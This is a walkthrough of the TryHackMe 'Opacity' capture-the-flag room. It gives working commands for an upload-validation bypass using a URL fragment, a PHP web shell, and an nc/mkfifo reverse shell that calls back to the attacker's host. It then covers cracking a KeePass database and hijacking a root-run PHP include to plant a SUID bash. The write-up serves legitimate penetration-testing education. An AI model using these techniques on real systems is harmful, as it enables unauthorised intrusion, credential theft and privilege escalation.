# Opacity

Opacity is a Boot2Root made for pentesters and cybersecurity enthusiasts.

Opacity is an easy machine that can help you in the penetration testing learning process.

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?

Hint: There are several ways to perform an action; always analyze the behavior of the application.

Room: https://tryhackme.com/room/opacity

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/opacity.md

------------------

# Opacity Walkthrough

## Overview

This room started with a fairly small attack surface: SSH, HTTP, and SMB. SMB allowed null/guest access but did not expose any useful readable shares. The main path ended up being through the web application on port 80.

The key vulnerability was in the **5 Minutes File Upload** feature under `/cloud/`. The application attempted to restrict uploads to images, but the validation could be bypassed using a URL fragment such as `#.png`. This allowed a PHP payload to be fetched as `cmd.php` while still passing the application’s image extension check.

From there, we gained a shell as `www-data`, found a readable KeePass database, cracked it, used the recovered credentials to become `sysadmin`, and then abused a root-run PHP backup script to get root.

## Enumeration

I started with a full TCP scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.66.152.136
```

Open ports:

```text
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp  open  http        Apache httpd 2.4.41
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

The web server redirected to a login page:

```text
http-title: Login
Requested resource was login.php
```

SMB was also available, so I checked for anonymous shares.

```bash
smbclient -L //10.66.152.136 -N
```

Output:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service
```

I also ran `enum4linux-ng`:

```bash
enum4linux-ng -A 10.66.152.136
```

The useful result was that SMB allowed anonymous/guest authentication, but there were no useful shares:

```text
print$  Mapping: DENIED
IPC$    IPC only
```

So SMB was a dead end.

## Web Enumeration

I browsed the web server and found a cloud upload feature:

```text
http://10.66.152.136/cloud/
```

The page was titled:

```text
5 Minutes File Upload - Personal Cloud Storage
```

Directory brute forcing revealed a few interesting paths:

```bash
gobuster dir -u http://10.66.152.136/cloud/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,bak,old,zip
```

Results:

```text
/images       301
/index.php    200
/storage.php  200
```

The upload form accepted a `url` parameter. It was not a normal file upload. Instead, the application fetched a remote URL server side.

Example request:

```bash
curl 'http://10.66.152.136/cloud/' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'url=http%3A%2F%2F10.66.71.185%3A8000%2Ftest.png'
```

I hosted test files from the AttackBox:

```bash
python3 -m http.server 8000
```

The target requested the hosted image and saved it under:

```text
/cloud/images/
```

## Testing Upload Behaviour

I created a small script to try different extensions and watched the Python HTTP server logs to see which files the target fetched.

The application fetched these types:

```text
probe.png
probe.jpg
probe.jpeg
probe.gif
probe.php.png
probe.php.jpg
probe.php.jpeg
probe.php.gif
probe.phtml.png
probe.phar.png
```

It did not fetch direct PHP extensions:

```text
probe.php
probe.php5
probe.phtml
probe.phar
```

Uploading a PHP payload with an image extension worked, but Apache served it statically:

```bash
printf '\x89PNG\r\n\x1a\n<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>' > cmd.php.png
```

After uploading, requesting it showed the raw PHP source:

```bash
curl -i 'http://10.66.152.136/cloud/images/cmd.php.png?cmd=id'
```

Response:

```text
Content-Type: image/png

�PNG
<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>
```

So normal double extensions did not execute.

## The Upload Bypass

The hint suggested there were several ways to perform an action and that the application behaviour should be analysed.

The key was using a URL fragment:

```text
cmd.php#.png
```

The application saw the URL as ending in `.png`, so it passed validation. However, when the server fetched the URL, the fragment was not sent in the HTTP request. That meant the target fetched:

```text
/cmd.php
```

instead of:

```text
/cmd.php#.png
```

I created a PHP command shell:

```bash
cat > cmd.php <<'EOF'
<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>
EOF
```

Started the local HTTP server:

```bash
python3 -m http.server 8000
```

Then uploaded it using the fragment bypass:

```bash
curl -i "http://10.66.136.20/cloud/index.php" \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H "Cookie: PHPSESSID=fresh13620" \
  --data-raw "url=http%3A%2F%2F10.66.71.185%3A8000%2Fcmd.php%23.png"
```

The Python server showed that the target requested `/cmd.php`:

```text
GET /cmd.php HTTP/1.1
```

Then I tested command execution:

```bash
curl -i "http://10.66.136.20/cloud/images/cmd.php?cmd=id"
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed RCE as `www-data`.

## Reverse Shell

The upload directory was cleaned every minute or so, so I had to upload and trigger the shell quickly.

Listener:

```bash
nc -lvnp 4444
```

Payload trigger:

```bash
curl "http://10.66.136.20/cloud/images/cmd.php?cmd=rm%20-f%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/bash%20-i%202%3E%261%7Cnc%2010.66.71.185%204444%20%3E/tmp/f"
```

Shell received:

```text
Connection received on 10.66.136.20
bash: cannot set terminal process group
bash: no job control in this shell
www-data@ip-10-66-136-20:/var/www/html/cloud/images$
```

I upgraded the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## User Enumeration

As `www-data`, I searched for readable files owned by `sysadmin`:

```bash
find / -user sysadmin -type f -readable 2>/dev/null
```

This revealed:

```text
/opt/dataset.kdbx
/home/sysadmin/.bashrc
/home/sysadmin/.bash_logout
/home/sysadmin/.profile
```

The interesting file was:

```text
/opt/dataset.kdbx
```

Checking the file type showed it was a KeePass database:

```bash
file dataset.kdbx
```

Output:

```text
dataset.kdbx: Keepass password database 2.x KDBX
```

## Cracking KeePass

I transferred the database back to the AttackBox and converted it with `keepass2john`:

```bash
keepass2john dataset.kdbx > keepass.hash
```

Then cracked it with John:

```bash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John found the KeePass master password:

```text
74****63
```

I listed entries with `keepassxc-cli`:

```bash
keepassxc-cli ls dataset.kdbx
```

Output:

```text
user:password
```

Then displayed the entry:

```bash
keepassxc-cli show -s dataset.kdbx 'user:password'
```

Credentials recovered:

```text
UserName: sysadmin
Password: Cl0ud*******#8700
```

## Shell as sysadmin

I logged in as `sysadmin`:

```bash
ssh sysadmin@10.66.136.20
```

Then read the user flag:

```bash
cat ~/local.txt
```

Flag:

```text
6661b61b***********bf5b3c075e2
```

## Privilege Escalation

In the `sysadmin` home directory, there was a `scripts` directory owned by root:

```bash
ls -la /home/sysadmin
```

Relevant output:

```text
drwxr-xr-x 3 root root 4096 scripts
```

Inside:

```bash
cd /home/sysadmin/scripts
ls -la
```

Output:

```text
drwxr-xr-x 3 root     root     .
drwxr-xr-x 6 sysadmin sysadmin ..
drwxr-xr-x 2 sysadmin root     lib
-rw-r----- 1 root     sysadmin  script.php
```

The script was readable by `sysadmin`:

```bash
cat script.php
```

Contents:

```php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

This explained why the uploaded shell disappeared quickly: the script cleaned `/var/www/html/cloud/images`.

The interesting part was:

```php
require_once('lib/backup.inc.php');
```

The `lib` directory was owned by `sysadmin`:

```bash
ls -la /home/sysadmin/scripts/lib
```

Output:

```text
drwxr-xr-x 2 sysadmin root .
-rw-r--r-- 1 root     root backup.inc.php
```

Even though `backup.inc.php` itself was owned by root, the directory was owned by `sysadmin`, so I could rename the file and create a replacement with the same name.

I replaced `backup.inc.php` with a payload that created a SUID bash binary:

```bash
cd /home/sysadmin/scripts/lib

mv backup.inc.php backup.inc.php.bak

cat > backup.inc.php <<'EOF'
<?php
function zipData($source, $destination) {
    system('cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash');
    return true;
}
?>
EOF
```

After waiting for the scheduled job to run, `/tmp/rootbash` appeared:

```bash
ls -la /tmp/rootbash
```

Then I used it to get a root shell:

```bash
/tmp/rootbash -p
```

Confirmed root:

```bash
id
```

Output:

```text
uid=1000(sysadmin) gid=1000(sysadmin) euid=0(root)
```

## Root Flag

From the root shell:

```bash
cat /root/proof.txt
```

## Summary

The final attack chain was:

```text
Nmap enumeration
→ Web upload feature found at /cloud/
→ Upload validation bypass with cmd.php#.png
→ PHP shell saved as /cloud/images/cmd.php
→ RCE as www-data
→ Reverse shell
→ Find readable /opt/dataset.kdbx
→ Crack KeePass database with John
→ Recover sysadmin credentials
→ SSH as sysadmin
→ Read local.txt
→ Discover root-run PHP cleanup/backup script
→ Abuse writable lib directory and replace backup.inc.php
→ Root job creates SUID /tmp/rootbash
→ Root shell
→ Read proof.txt
```

## Key Lessons

* Server-side URL fetchers can behave differently from browser requests.
* URL fragments are not sent in HTTP requests, which can bypass extension checks when validation is done on the raw URL string.
* Double extensions are not always enough; checking actual server behaviour is more important than assuming upload equals RCE.
* KeePass databases are valuable loot when readable by low-privileged users.
* Directory write permission can be dangerous even when individual files inside are owned by root.
* Root-run scripts that include files from writable directories can lead directly to privilege escalation.

